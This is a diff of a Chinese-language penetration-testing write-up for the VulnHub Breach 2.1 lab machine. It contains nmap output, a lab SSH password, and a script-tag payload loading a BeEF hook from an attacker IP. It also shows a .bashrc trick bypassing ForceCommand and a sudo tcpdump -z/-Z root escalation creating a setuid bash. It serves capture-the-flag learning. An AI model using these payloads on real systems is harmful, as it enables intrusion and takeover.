@@ -4,14 +4,6 @@ platform: VulnHub
 os: Linux
 difficulty: Hard
 track: Standalone
-status: Complete
-tags:
-- 平台-VulnHub
-- 系统-Linux
-- 难度-Hard
-- 方向-Standalone
-- 状态-Complete
-- 专题-Breach
 ---
 - 靶机链接:https://www.vulnhub.com/entry/breach-21,159/
 
@@ -22,8 +14,8 @@ tags:
 所以打之前要把自己的机器设置到相同的C段
 ### 端口扫描
 #### 全端口扫描
-- 注意这里的80一开始是扫不到的，在ssh连接peter并使用密码inthesource后才会开放
-~~~
+注意这里的80一开始是扫不到的，在ssh连接 peter 并使用密码 inthesource 后才会开放。
+```
 ┌──(kali㉿kali)-[~/breach]
 └─$ sudo nmap -sT -sV -p- --min-rate 5000  192.168.110.151 -oA nmap/ports
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:13 EDT
@@ -41,9 +33,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
 
-~~~
+```
 #### 默认脚本扫描
-~~~
+```
 ┌──(kali㉿kali)-[~/breach]
 └─$ sudo nmap -sT -sV -sC -p80,111,39250,65535 192.168.110.151 -oA nmap/sC                  
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:13 EDT
@@ -77,9 +69,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
-~~~
+```
 #### 漏洞脚本扫描
-~~~
+```
 ┌──(kali㉿kali)-[~/breach]
 └─$ sudo nmap -sT -sV --script=vuln -p111,39250,65535 192.168.110.151 -oA nmap/vuln
 [sudo] password for kali:
@@ -101,9 +93,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 50.79 seconds
 
-~~~
+```
 #### UDP 扫描
-~~~
+```
 ┌──(kali㉿kali)-[~/breach]
 └─$ sudo nmap -sU --top-ports 20 192.168.110.151 -oA nmap/UDP            
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 10:34 EDT
@@ -135,8 +127,7 @@ MAC Address: 00:0C:29:B5:09:48 (VMware)
 
 Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
 
-~~~
-
+```
 ### 65535 端口 OpenSSH 6.7p1
 ![](./Pasted_image_20241026224233.png)
 存在用户名枚举，暂时搁置
@@ -197,9 +188,9 @@ Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
 查看exp
 ![](./Pasted_image_20241028193353.png)
 构造payload
-~~~
+```
 <script src="http://192.168.110.128:3000/hook.js"></script>
-~~~
+```
 ![](./Pasted_image_20241028195216.png)
 访问members.html即可触发
 ![](./Pasted_image_20241028201427.png)
@@ -212,12 +203,12 @@ Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
 ![](./Pasted_image_20241029144332.png)
 成功拿到shell，这里要去想一下我们的ssh连接为什么会被关闭
 在/etc/ssh/sshd_config文件中发现
-~~~
+```
 UsePAM yes
 AllowUsers peter
 ForceCommand /usr/bin/startme
 AddressFamily inet
-~~~
+```
 可以用`echo "exec sh" > ~/.bashrc`绕过
 再次连接ssh
 ![](./Pasted_image_20241029145247.png)
@@ -225,9 +216,9 @@ AddressFamily inet
 ## 权限提升
 ### 升级终端
 提升一下交互性
-~~~
+```
 export TERM=xterm
-~~~
+```
 ### 信息枚举
 在/var/www/html/blog/config.php中找到mysql的登录凭据
 ![](./Pasted_image_20241029152649.png)
@@ -282,11 +273,10 @@ cat /etc/passwd
 终于我们可以愉快的提权了
 tcpdump中有两个参数-z和-Z，前者用来执行一个脚本，后者用来指定tcpdump以哪个用户运行，当可以通过sudo执行时，则可以指定以root用户运行一个脚本，从而提权
 编写提权脚本
-~~~
+```
 cp /bin/bash /tmp/rootshell
 chmod +sx /tmp/rootshell
-~~~
-
+```
 sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exp.sh -Z root
 
 执行成功
